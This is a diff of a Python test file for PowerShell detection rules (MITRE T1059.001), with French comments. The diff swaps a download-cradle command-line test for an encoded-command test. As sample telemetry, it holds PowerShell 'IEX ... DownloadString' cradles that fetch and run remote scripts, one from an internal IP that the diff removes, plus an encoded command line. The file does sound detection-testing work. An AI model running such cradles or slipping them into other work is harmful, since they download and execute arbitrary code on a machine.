@@ -64,10 +64,12 @@ CRADLE_SCRIPTBLOCK = (
     "'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/"
     "install-atomicredteam.ps1' -UseBasicParsing)  # " + "A" * 400
 )
-# Cradle équivalent lancé comme processus (ligne de commande, EID 1)
-CRADLE_CMDLINE = (
-    'powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient)'
-    ".DownloadString('http://10.0.0.5/a.ps1')\""
+# Commande encodée réelle observée dans la détonation (ligne de commande, EID 1) ; > 256 car.
+ENCODED_CMDLINE = (
+    "powershell.exe -NoProfile -EncodedArguments "
+    "PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBo"
+    + "A"
+    * 400
 )
 
 
@@ -145,7 +147,7 @@ def test_scriptblock_rule_matches_real_cradle(temp_index):
     assert _count(temp_index, query) == 1
 
 
-def test_cmdline_rule_matches_process_cradle(temp_index):
+def test_encoded_command_rule_matches_real_telemetry(temp_index):
     doc = {
         "data": {
             "win": {
@@ -155,13 +157,11 @@ def test_cmdline_rule_matches_process_cradle(temp_index):
                 },
                 "eventdata": {
                     "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                    "commandLine": CRADLE_CMDLINE,
+                    "commandLine": ENCODED_CMDLINE,
                 },
             }
         }
     }
     _req("POST", f"/{temp_index}/_doc?refresh=true", doc)
-    query = _convert(
-        "detections/windows/t1059.001_powershell_download_cradle_cmdline.yml"
-    )
+    query = _convert("detections/windows/t1059.001_powershell_encoded_command.yml")
     assert _count(temp_index, query) == 1
